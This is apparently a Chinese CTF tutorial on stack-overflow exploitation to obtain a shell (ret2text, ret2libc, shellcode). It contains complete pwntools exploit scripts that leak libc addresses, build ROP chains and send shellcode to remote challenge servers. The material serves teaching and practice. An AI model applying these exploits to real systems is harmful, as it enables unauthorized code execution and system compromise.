# 原创
：  栈溢出至getshell分析及利用

# 栈溢出至getshell分析及利用

> 
公众号：掌控安全EDU 分享更多技术文章，欢迎关注一起探讨学习


**目录**

[Ret2text（源程序中存在system及/bin/sh）](#Ret2text%EF%BC%88%E6%BA%90%E7%A8%8B%E5%BA%8F%E4%B8%AD%E5%AD%98%E5%9C%A8system%E5%8F%8A%2Fbin%2Fsh%EF%BC%89)

[32位程序](#32%E4%BD%8D%E7%A8%8B%E5%BA%8F)

[64位程序：](#64%E4%BD%8D%E7%A8%8B%E5%BA%8F%EF%BC%9A)

[Ret2libc2（源程序中存在system的地址不存在/bin/sh）](#Ret2libc2%EF%BC%88%E6%BA%90%E7%A8%8B%E5%BA%8F%E4%B8%AD%E5%AD%98%E5%9C%A8system%E7%9A%84%E5%9C%B0%E5%9D%80%E4%B8%8D%E5%AD%98%E5%9C%A8%2Fbin%2Fsh%EF%BC%89)

[Bass段](#Bass%E6%AE%B5)

[Gets（）函数](#Gets%EF%BC%88%EF%BC%89%E5%87%BD%E6%95%B0)

[Readelf](#Readelf)

[Ret2libc2](#Ret2libc2)

[Ret2libc3（源程序中不存在system的地址不存在/bin/sh）](#Ret2libc3%EF%BC%88%E6%BA%90%E7%A8%8B%E5%BA%8F%E4%B8%AD%E4%B8%8D%E5%AD%98%E5%9C%A8system%E7%9A%84%E5%9C%B0%E5%9D%80%E4%B8%8D%E5%AD%98%E5%9C%A8%2Fbin%2Fsh%EF%BC%89)

[Shellcode生成](#Shellcode%E7%94%9F%E6%88%90)

---


### Ret2text（源程序中存在system及/bin/sh）

控制程序执行程序本身已有的的代码(.text)。栈溢出，存在system()函数以及”/bin/sh”字符串。通过溢出将返回地址修改为system函数的地址，再将/bin/sh作为函数的参数进行调用，如此便可以得到一个shell。其中32位程序和64位程序由于函数形参的存储调用存在差别，故利用方式也会不同。

#### 32位程序

在32位的程序中，形参存储在栈上并且是按从右到左的顺序进行存放，形参结束后存储的是函数的返回地址，接着是函数的地址。

函数调用过程中栈帧的变化<img alt="" height="349" src="https://img-blog.csdnimg.cn/0376d894f2c345b9a61f4b7d67fa8902.jpeg" width="674"/>**以下为栈溢出调用system函数过程中栈的变化。**<img alt="" height="474" src="https://img-blog.csdnimg.cn/4d55a1a795b0458cb35e2107973d60ce.jpeg" width="690"/>

**其中call函数与直接用eip指向函数地址的区别**

**call函数的调用中存在两步，**

**从call函数的执行可以看出会自动的将下一指令的地址入栈以保持栈的平衡，call的函数执行完成后会能恢复，所以当直接将函数地址赋给EIP时就需要手动的入栈一个返回地址以维持栈的平衡。**

#### **64位程序：**

由于在64位程序中六个参数依次保存在RDI，RSI，RDX，RCX，R8和 R9中，如果还有更多的参数的话才会保存在栈上。如下<img alt="" height="410" src="https://img-blog.csdnimg.cn/735cc880cac14eec8a6e23dc89a86b0a.jpeg" width="690"/>

**通过以上流程即是可以通过寻找我们需要的指令地址及字符串地址进行利用链的构造最后成功getshell。这既是要求在上述情况中存在调用system函数的情况并且能够在其中找到字符串/bin/sh才能进行利用。**

以下使用一个在程序作为例题进行分析

#### 例题：

获取附件

使用checksec检查是否开启了保护<img alt="" height="182" src="https://img-blog.csdnimg.cn/cbf0a425b56f4056a06dd1504668dad7.jpeg" width="677"/>

发现是一个32位的程序，只开启了NX，即是栈不可执行

使用IDA32位进行分析<img alt="" height="315" src="https://img-blog.csdnimg.cn/a08d4233d8a64e9f8f4f74d7040a59ff.jpeg" width="690"/>

使用shift+F12得到如上所示的页面

其中存在/bin/sh，但现在需要一个函数调用它才能执行命令

首先双击echo Hello World<img alt="" height="307" src="https://img-blog.csdnimg.cn/f1cdf2ccf4b64c5b959c06d015ae8e0c.jpeg" width="690"/>使用ctrl+x查看引用的函数<img alt="" height="331" src="https://img-blog.csdnimg.cn/05b3a08a8ef946c5bbe32f66931bbde7.jpeg" width="690"/>使用F5进行反汇编<img alt="" height="114" src="https://img-blog.csdnimg.cn/c5799381704841ec934747411b9d0bd7.jpeg" width="690"/>发现存在vulnerable_function函数，双击进入<img alt="" height="194" src="https://img-blog.csdnimg.cn/30d7e5ce3b8b4400b080716a762a782f.jpeg" width="522"/>

发现存在read函数可以利用

查看buf的长度，双击char buf进入buf变量的栈空间<img alt="" height="422" src="https://img-blog.csdnimg.cn/de904e1768194cdcba248d9bf706ab27.jpeg" width="498"/>

发现buf的长度为0x88字节

加上ebp的长度4字节，（32位程序地址为32位，所占存储空间为4字节）

即是buf只用88字节，使用read函数输入的空间有100，超过了buf的长度，可造成栈溢出覆盖掉返回地址即可执行代码

因为前面存在了调用system函数，跳转到该函数，后面跟上该函数参数的地址即可

查看system的地址，回到主函数的汇编代码，此处使用call调用了一个system

地址为：0x0804849e<img alt="" height="280" src="https://img-blog.csdnimg.cn/a73f1ee547564f4c924c79e950ec98c4.jpeg" width="690"/>查看字符/bin/sh的位置，如下得到地址为：0x0804a024<img alt="" height="239" src="https://img-blog.csdnimg.cn/24423711590b4704a08fac5c2b423440.jpeg" width="604"/>

构造exp

<img alt="" height="326" src="https://img-blog.csdnimg.cn/0ff928735fc046709a779ba26bc8b3c7.jpeg" width="690"/>执行exp得到shell,执行命令

### Ret2libc2（源程序中存在system的地址不存在/bin/sh）

ret2libc 即控制函数的执行 libc 中的函数

#### Bass段

BSS段通常是指用来存放程序中未初始化的或者初始化为0的全局变量和静态变量的一块内存区域。特点是可读写的，在程序执行之前BSS段会自动清0。

#### Gets（）函数

char gets(char *str)：只有一个参数。参数类型为char*型。即是str可以是一个字符指针变量名，也可以是一个字符数组名。gets（）函数的功能是从输入缓决区中读取一个字符串存到字符指针变量所指向的空间。

#### Readelf

用于显示ELF文件（如.so、.a、.o文件等）的相关信息。<img alt="" height="407" src="https://img-blog.csdnimg.cn/5e42b771f84444d2801251c97c404f76.jpeg" width="690"/>

使用readelf -S 文件名   //获取各段的信息<img alt="" height="1161" src="https://img-blog.csdnimg.cn/10c66538828b419db316f4dc401ff204.jpeg" width="690"/>通常使用readelf -S 文件名 |grep bss<img alt="" height="111" src="https://img-blog.csdnimg.cn/fae2e15905e44e618a94427d5d580af1.jpeg" width="690"/>

#### Ret2libc2

当一个程序存在栈溢出漏洞，查看代码发现能够找到system函数的地址但不存在/bin/sh。于是就需要将/bin/sh写入作为system函数的参数进行使用。

通常选择将/bin/sh字符串写入到.bss段。即是可以使用gets函数,将可以写入的bass段地址作为gets 的参数。即是首先需要找到bss段的地址。（使用readelf -S）进行查找。

在32位程序中通过栈溢出写入/bin/sh时栈空间的构造如下

### Ret2libc3（源程序中不存在system的地址不存在/bin/sh）

此时的system函数属于的是libc动态链接库，而在libc.so中的函数之间的相对偏移为固定的，即是有序存放在libc中，当加载时如果能获取到libc的加载基地址，以及找到函数的偏移的话即可确定我们需要的函数地址。

ROP链如下

#### 例题：

将下载的程序使用ida进行分析，main函数如下，为一个选择加解密的程序。

<img alt="" height="323" src="https://img-blog.csdnimg.cn/7e41d249e2dd4fb5af06da406c3c1f67.jpeg" width="690"/>进入加密函数中<img alt="" height="334" src="https://img-blog.csdnimg.cn/797db9f832424bc9a58b3a5daa055bdb.jpeg" width="690"/>

存在一个get输入并未限制其输入长度，存在栈溢出漏洞。查看s的长度为0x50,加上一个存放RBP的地址长度8 ，即是返回地址在第88字节以后。<img alt="" height="348" src="https://img-blog.csdnimg.cn/19672524053f499d89b1ff01c1595e80.jpeg" width="658"/>

其中输入的字符串会被加密即是进行一串异或，但可以在字符串开头使用/0绕过加密过程。

查看所有的字符串及函数，未发现system函数及/bin/sh等字符串<img alt="" height="285" src="https://img-blog.csdnimg.cn/153b07078fc54b5980faacb9a888c2cb.jpeg" width="690"/>

于是采用动态链接库libc中的函数进行shell获取

Payload1：

> 
payload=b'\0'+b'a'*(0x50-1) +p64(0) + pop_rdi_ret + p64(puts_got) + p64(puts_plt) + main_addr


其中pop_rdi_ret为指令 pop rdi ret的地址（获取方法为：ROPgadget --binary ciscn_2019_c_1  --only 'pop|ret' | grep 'rdi'） <img alt="" height="44" src="https://img-blog.csdnimg.cn/3592c7972bc24023902a3d4d6939f7ab.jpeg" width="690"/>

Payload2：

```
payload1=b'\0' + b'a'*(0x58-1) + p64(ret) + pop_rdi_ret + p64(bin_sh_addr) + p64(system_addr)
```

其中p64(ret)为一条指令ret的地址（由于在ubuntu18以上版本调用system时需要使得esp的地址是16字节对齐，即是esp指向的地址末尾需要是0）

```
ROPgadget --binary ciscn_2019_c_1  --only 'pop|ret' | grep 'ret'
```

完整的exp如下：

> 
<pre>1.from pwn import *
2.from LibcSearcher import LibcSearcher
3.#context.log_level = "debug"
4.
5.
6.sh =remote("node4.buuoj.cn",25130)
7.elf=ELF("./ciscn_2019_c_1")
8.ret=0x4006B9 
10.
11.print("start1-----------------------------------")
12.puts_plt=elf.plt["puts"]    #获取puts函数的plt表项地址13.puts_got=elf.got["puts"]    #获取puts函数的got表项地址14.pop_rdi_ret=p64(0x400c83)   #pop rdi ret  指令的地址
15.main_addr = p64(0x400B28)   #main函数的地址
16.
17.
18.payload=b'\0'+b'a'*(0x50-1) +p64(0) + pop_rdi_ret + p64(puts_got) + p64(puts_plt) + main_addr   #使用plt调用 puts函数,
19.#使用puts函数的got作为参数进行打印获取puts的真实地址，后返回main函数
20.sh.recv()
21.sh.sendline(b"1")  #进入encrypt函数进行溢出
22.sh.recv()
23.sh.sendline(payload)
24.sh.recvuntil("Ciphertext\n")
25.sh.recvuntil("\n")
26.puts_addr=u64(sh.recv(6).ljust(8,b'\x00')) #接收真实puts地址  64位
27.##puts_addr = u32(io.recv(4))              #32位接收真实地址28.print("realaddr:",hex(puts_addr))
29.
30.
31.print("start2------------------------")
32.obj = LibcSearcher("puts",puts_addr)      #确认libc的版本
33.libcbase = puts_addr - obj.dump('puts')   #dump计算偏移，从而求出libc的基址34.system_addr = libcbase + obj.dump('system')   #计算出system的偏移地址加上基址得到system的真实地址
35.bin_sh_addr = libcbase + obj.dump('str_bin_sh')      #计算/bin/sh的真实地址
36.
37.
38.print("打印puts,system，/bin/sh的真实地址")
39.print("puts的真实地址:",hex(puts_addr))
40.print("system的真实地址:",hex(system_addr))
41.print("/bin/sh的真实地址:",hex(bin_sh_addr))
42.print("基地址:",hex(libcbase))
43.print("END!!!!!!!!!")
44.
45.
46.print("start3------------------------")
47.payload1=b'\0' + b'a'*(0x58-1) + p64(ret) + pop_rdi_ret + p64(bin_sh_addr) + p64(system_addr) #在返回地址上写入ret的地址维持RSP对齐
48.
49.
50.sh.sendline(b'1')      #发送1进入encrypt函数
51.sh.recvuntil("encrypted\n")
52.sh.sendline(payload1)

`53.sh.interactive()`</pre>


```
1.context(os=’linux’, arch=’amd64’, log_level=’debug’)//主要设置arch=amd64</code>`2.//os设置系统为linux系统,大多数pwn题目的系统都是linux`<code>3.//arch设置为amd64，可以简单的认为设置为64位的模式，对应的32位模式是’i386’
```

#### 例题：

首先检查安全保护<img alt="" height="192" src="https://img-blog.csdnimg.cn/25fba892bc13490abda0c294158eb494.jpeg" width="678"/>

发现存在可读写执行的段，既可以写入shellcode的方式获取shell

使用64位的IDA进行分析获取源码如下<img alt="" height="278" src="https://img-blog.csdnimg.cn/bb89c050d3054260997e1109bb041e26.jpeg" width="690"/>

输入两段数据，name读取100个字符存入，不存在溢出

在输入text时未做输入限制，可能存在溢出漏洞

首先查看name的存储位置<img alt="" height="147" src="https://img-blog.csdnimg.cn/177458a8ca7042829aaa3f73061ffcf8.jpeg" width="690"/>

Bss段的0x601080

查看text的大小，text大小30，离ebp的距离为32<img alt="" height="162" src="https://img-blog.csdnimg.cn/5e210f5dd1f841a7b698a6d6afef8dc6.jpeg" width="690"/>

此时如果name段拥有执行权限时，即可通过text溢出跳转到name的shellcode执行

使用工具生成shellcode

```
shellcode=(asm(shellcraft.amd64.sh()))
```

完整EXP

```
1.from pwn import *</code>`2.context.log_level = "debug"``3.context.os='linux'``4.context.arch='amd64'``5.#elf=ELF('./ciscn_2019_n_5')``6.sh = remote("node4.buuoj.cn",28370)``7.shellcode=(asm(shellcraft.amd64.sh()))    #生成shellcode  64位需要设置开头第三第四行``8.payload=b'a'*(0x20+8)+p64(0x601080)     #计算溢出的大小，将返回地址覆盖为写入的shellcode地址``9.#print(shellcode)``10.sh.recv()``11.sh.sendline(shellcode)``12.sh.recv()``13.sh.sendline(payload)``14.sh.interactive()`   </pre>
成功获取到shell。
<pre><code>原文地址: https://www.freebuf.com/vuls/356152.html
```

**没看够~？欢迎关注！**

**  **<img alt="" height="567" src="https://img-blog.csdnimg.cn/d89b5fd1e8b24bb0a88152b3995f9ebd.jpeg" width="1015"/>

###  渗透工具

### 技术文档、书籍

<img alt="" height="516" src="https://img-blog.csdnimg.cn/f333a24647774be5b99b00fb7019d620.png" width="852"/> <img alt="" height="523" src="https://img-blog.csdnimg.cn/3e579b7d7a164889a57771c035775069.png" width="856"/>

### 面试题

### 帮助你在面试中脱颖而出

### 视频

### 基础到进阶

### 环境搭建、HTML，PHP，MySQL基础学习，信息收集，SQL注入,XSS，CSRF，暴力破解等等

<img alt="" height="481" src="https://img-blog.csdnimg.cn/a601ca2e0eb040bd911477a4f54fef8e.png" width="694"/> <img alt="" height="77" src="https://img-blog.csdnimg.cn/04beeeb6757b422a83ca0900a349a544.png" width="665"/>
